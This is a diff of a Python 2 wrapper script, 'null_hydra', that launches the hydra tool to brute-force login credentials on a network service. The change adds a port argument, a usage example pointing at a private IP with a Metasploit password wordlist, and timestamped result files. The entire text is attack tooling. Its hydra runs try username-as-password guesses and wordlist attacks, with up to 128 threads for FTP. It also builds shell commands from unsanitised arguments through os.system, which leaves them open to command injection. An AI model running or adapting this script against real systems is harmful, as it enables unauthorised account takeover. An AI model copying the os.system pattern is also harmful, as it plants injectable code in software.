@@ -1,11 +1,18 @@
-﻿#!/usr/bin/python
+#!/usr/bin/python
 __author__ = 'mannea'
 import sys
+import datetime
 import os
 
-if len(sys.argv) != 5:
-    print "null_hydra <ip address> <user or .txt list> <password list> <service>"
+if len(sys.argv) != 6:
+    print "null_hydra <ip address> <user or .txt list> <password list> <service> <port>"
+    print "null_hydra 192.168.15.216 users.txt /usr/share/wordlists/metasploit/unix_passwords.txt ftp 21"
     sys.exit(0)
+
+
+def date_time_stamp():
+    r = str(datetime.datetime.now().strftime("%Y-%m-%d_%H%M%S")).rstrip()
+    return r
 
 current_dir = os.popen('pwd').read().rstrip()
 
@@ -13,24 +20,26 @@ address = sys.argv[1].strip()
 user = sys.argv[2].strip()
 pass_list = sys.argv[3].strip()
 service = sys.argv[4].strip()
+port = sys.argv[5].strip()
+
 threads = '10'
 if service == 'ftp':
     threads = '128'
 
-out_file = current_dir + '/hydra_results_' + user
+out_file = current_dir + '/hydra_results_' + str(date_time_stamp()) + '.txt'
 print('Saving results to: ' + out_file)
 
 if '.txt' in user:
     user_listing = '-L'
     for line in open(user):
         line = line.strip()
-        cmd = 'hydra -l %s -p %s -v -V -e ns -f -o %s.txt %s %s' % (line, line, out_file, address, service)
+        cmd = 'hydra -l %s -p %s -v -V -e ns -f -o %s.txt %s -s %s %s' % (line, line, out_file, address, port, service)
         print(cmd)
         os.system(cmd)
 else:
     user_listing = '-l'
 
-cmd = 'xterm +sb -geometry 120x10 -e "hydra %s %s -P %s -t %s -v -e ns -f -o %s.txt %s %s; bash" &' % (
-    user_listing, user, pass_list, threads, out_file, address, service)
+cmd = 'xterm +sb -geometry 120x10 -e "hydra %s %s -P %s -t %s -v -V -e ns -f -o %s.txt %s -s %s %s; bash" &' % (
+    user_listing, user, pass_list, threads, out_file, address, port, service)
 print(cmd)
 os.system(cmd)
